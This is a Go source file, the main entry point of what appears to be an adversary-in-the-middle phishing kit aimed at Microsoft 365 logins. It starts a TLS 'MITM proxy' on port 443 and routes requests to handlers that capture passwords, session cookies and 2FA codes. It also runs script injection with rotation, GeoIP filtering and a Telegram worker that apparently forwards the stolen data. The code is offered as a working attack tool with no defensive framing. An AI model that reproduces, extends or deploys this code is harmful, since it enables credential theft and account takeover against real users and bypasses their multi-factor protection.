package main

import (
	"context"
	"crypto/tls"
	"net/http"
	"os"
	"time"

	"github.com/joho/godotenv"

	"o365/capture"
	"o365/configdb"
	"o365/firestore"
	"o365/handlers"
	"o365/inject"
	"o365/proxy"
	"o365/slug"
	"o365/telegramq" // ✅ NEW
	tlsloader "o365/tls"
	"o365/utils"
	"o365/ws"
)

/* ───── middleware: ensure slug is present, place in context ─── */

type contextKey string

const slugKey contextKey = "slug"

func SlugMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		slug, err := slug.GetSlugFromRequest(r)
		if err != nil {
			http.Error(w, "slug missing", http.StatusBadRequest)
			return
		}

		http.SetCookie(w, &http.Cookie{
			Name:     "o365_slug",
			Value:    slug,
			MaxAge:   900,
			HttpOnly: true,
			Path:     "/",
		})

		ctx := context.WithValue(r.Context(), slugKey, slug)
		next.ServeHTTP(w, r.WithContext(ctx))
	})
}

func main() {
	_ = godotenv.Load()
	utils.InitLogger()

	devMode := os.Getenv("DEV_MODE") == "true"
	inject.SetDevMode(devMode)
	if devMode {
		utils.SystemLogger.Info().Msg("🧪 Dev mode ENABLED")
	} else {
		utils.SystemLogger.Info().Msg("🚫 Dev mode DISABLED")
	}

	if err := configdb.InitLocalDB(); err != nil {
		utils.SystemLogger.Fatal().Err(err).Msg("init DB failed")
	}

	inject.StartAutoRotation()
	time.Sleep(2 * time.Second)
	inject.InitScript()

	var cert tls.Certificate
	var domain string
	if devMode {
		cert, domain = tlsloader.LoadDevCert()
	} else {
		cert, domain = tlsloader.LoadProdCert(context.Background())
	}
	utils.SystemLogger.Info().Str("domain", domain).Msg("TLS ready")

	if err := utils.InitGeoDB("geo/GeoLite2-Country.mmdb"); err != nil {
		utils.SystemLogger.Fatal().Err(err).Msg("GeoIP load failed")
	}

	_ = configdb.LoadFromLocalDB()
	configdb.OnStatUpdated = ws.HandleSlugStatUpdate

	// ✅ Start Telegram queue worker
	telegramq.InitTelegramRedis()      // ✅ Init Redis client
	go telegramq.StartTelegramWorker() // ✅ Start background worker

	// Routes
	mux := http.NewServeMux()
	withSlug := func(path string, h http.HandlerFunc) {
		mux.Handle(path, SlugMiddleware(h))
	}

	if err := firestore.InitFirestore(); err != nil {
		utils.SystemLogger.Fatal().Err(err).Msg("Firestore init failed")
	}

	mux.Handle("/ws", http.HandlerFunc(ws.HandleWebSocket))
	withSlug("/login", handlers.HandleLoginCheck)
	withSlug("/submit", capture.HandleSubmit)
	withSlug("/pass", capture.HandlePass)
	withSlug("/cookie", capture.HandleCookie)
	withSlug("/2fa", capture.Handle2FA)
	withSlug("/sync", capture.HandleSessionSync)
	withSlug("/jscheck", handlers.HandleJSCheck)
	withSlug("/track/otp", handlers.HandleOTPTrack)
	withSlug("/stats", handlers.HandleSlugStats)

	addr := ":443"
	utils.SystemLogger.Info().Str("addr", addr).Str("domain", domain).
		Msg("🚀 MITM proxy starting")

	if err := proxy.StartTLSIntercept(addr, mux, cert); err != nil {
		utils.SystemLogger.Fatal().Err(err).Msg("proxy start failed")
	}
}
